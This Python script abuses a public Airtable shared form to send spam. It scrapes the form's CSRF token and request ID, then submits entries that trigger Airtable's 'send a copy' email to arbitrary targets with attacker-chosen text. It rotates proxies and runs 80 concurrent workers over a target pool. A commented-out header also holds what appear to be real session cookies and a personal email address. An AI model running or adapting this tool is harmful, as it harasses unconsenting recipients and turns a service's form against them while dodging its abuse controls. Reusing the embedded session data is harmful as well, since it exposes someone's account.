import re
from os.path import basename

import requests

import module

request_id_pattern = re.compile('(?<=requestId: \").*(?=",)')
csrf_pattern = re.compile('(?<=\"csrfToken\":\").*(?=\",\"enabledFeatureNames\")')


def get(s):
    headers = {
        'authority': 'airtable.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }

    response = s.get('https://airtable.com/shr5EbDqxiDMXlPEO', headers=headers)
    return response


def post(s, request_id, csrf, target, text):
    headers = {
        'authority': 'airtable.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'brw=brwhaUD4kzUZ5lMyg; _gcl_au=1.1.313778930.1675071403; _ga=GA1.2.1706294687.1675071403; _pxvid=f508efe8-a216-11ed-b07e-7657574f5455; optimizelyEndUserId=oeu1675329111172r0.5439660237219517; amplitude_id_01c5c9182d4beaee719619af5db39310airtable.com=eyJkZXZpY2VJZCI6ImNmNWVhMzYwLTQ5NmYtNDM0MC05M2E0LTBlMTdlZjFjYjlhNFIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY3NTMyOTExMTQ4OSwibGFzdEV2ZW50VGltZSI6MTY3NTMyOTExMTQ5MCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjF9; _mkto_trk=id:458-JHQ-131&token:_mch-airtable.com-1675329111502-42943; localePref=auto; _fbp=fb.1.1675329129729.1912590730; __Host-airtable-session=eyJzZXNzaW9uSWQiOiJzZXNEbEhhRXpEbHlrMDJ1bSIsImNzcmZTZWNyZXQiOiJwZkhWVDdvNDZWaEV6OG8tS01seVJxcUUiLCJoaWdoU2VjdXJpdHlNb2RlRW5hYmxlZFRpbWUiOjE2NzUzMjkxMjc5NjgsInVzZXJJZCI6InVzcnZnWXdPR0RGYnpHb0RRIiwibG9nZ2VkSW5UaW1lIjoiMjAyMy0wMi0wMlQwOToxMjowOC4wMjJaIn0=; __Host-airtable-session.sig=dd-SAp1KN1m5SrckIVv5JYRQnwDAs8JtHdRs00b_DCo; _gid=GA1.2.298120653.1675675785; OptanonConsent=isGpcEnabled=0&datestamp=Wed+Feb+08+2023+13%3A10%3A28+GMT%2B0200+(%D0%92%D0%BE%D1%81%D1%82%D0%BE%D1%87%D0%BD%D0%B0%D1%8F+%D0%95%D0%B2%D1%80%D0%BE%D0%BF%D0%B0%2C+%D1%81%D1%82%D0%B0%D0%BD%D0%B4%D0%B0%D1%80%D1%82%D0%BD%D0%BE%D0%B5+%D0%B2%D1%80%D0%B5%D0%BC%D1%8F)&version=202211.1.0&isIABGlobal=false&hosts=&consentId=3eacbd10-1648-4cd2-b5aa-cbefb7582937&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false; _uetsid=cab1ed30a60011edabbe1576bd2a83a3; _uetvid=9b22e740a08111edaca9ada90411b9dc; mv=eyJzdGFydFRpbWUiOiIyMDIzLTAyLTA4VDExOjEwOjI5LjE3MFoiLCJsb2NhdGlvbiI6Imh0dHBzOi8vYWlydGFibGUuY29tLyIsImludGVybmFsVHJhY2VJZCI6InRyY2VNZVJzNjFZU0RtWTRJIn0=; _gat_UA-183354518-1=1; AWSALB=QHXCYU+eVIaw/Ftq7DzPDGX4GJ9GgrmDthIJ6OE201Ca3YB7pbPNt6RUZDOyiKMkfDtkYwTnTOZr7BO8tpysfdaXfe4oQc0xIhxP5fZ3O8P0w33uosHaK9u4zYGG; AWSALBCORS=QHXCYU+eVIaw/Ftq7DzPDGX4GJ9GgrmDthIJ6OE201Ca3YB7pbPNt6RUZDOyiKMkfDtkYwTnTOZr7BO8tpysfdaXfe4oQc0xIhxP5fZ3O8P0w33uosHaK9u4zYGG; mbpg=2024-02-08T11:15:33.902ZusrvgYwOGDFbzGoDQpro; mbpg.sig=SpwkVVqv62MF4O_oEnz0bGkEfXMmjAsZT-iLDJ9eYKU',
        'origin': 'https://airtable.com',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'x-airtable-application-id': 'appmSNPmE6mFLdYz2',
        'x-airtable-client-queue-time': '4',
        'x-airtable-inter-service-client': 'webClient',
        'x-airtable-inter-service-client-code-version': 'cb4c7f95baa0cb87e96ea315913db88ec54764f7',
        'x-airtable-page-load-id': 'pgliuuIlptPiLYsgb',
        'x-requested-with': 'XMLHttpRequest',
        'x-time-zone': 'Europe/Kiev',
        'x-user-locale': 'en',
    }

    data = {
        'stringifiedObjectParams': '{"rowId":"reco0ftcvnCOMWGKU","cellValuesByColumnId":{"fldv7F52kplhZfUiA":"test"},"userEmailForCopyOfFormSubmission":"wezxasqw@gmail.com"}'.replace(
            'wezxasqw@gmail.com', target).replace('test', text),
        'requestId': request_id,
        'accessPolicy': '{"allowedActions":[{"modelClassName":"view","modelIdSelector":"viwXY1LitdzJ56PpP","action":"readSharedFormData"},{"modelClassName":"view","modelIdSelector":"viwXY1LitdzJ56PpP","action":"submitSharedForm"},{"modelClassName":"application","modelIdSelector":"appmSNPmE6mFLdYz2","action":"createAttachmentUploadS3Policies"}],"shareId":"shr5EbDqxiDMXlPEO","applicationId":"appmSNPmE6mFLdYz2","generationNumber":0,"expires":"2023-03-02T00:00:00.000Z","signature":"e2129cc9108aa09a4cdf1e633d0231de2755b8059c7df0622ede5258e07b25b2"}',
        '_csrf': csrf,
    }
    response = s.post(
        'https://airtable.com/v0.3/view/viwXY1LitdzJ56PpP/submitSharedForm',
        headers=headers,
        data=data,
    )
    return response


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        s.proxies = self.get_proxies()
        get_resp = get(s)
        csrf = csrf_pattern.search(get_resp.text)
        request_id = request_id_pattern.search(get_resp.text)
        post_resp = post(s, request_id, csrf, target, self.get_text(target=target))
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], '"msg":"SUCCESS"', target_pool_name='pobcasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently(80)


if __name__ == '__main__':
    main()
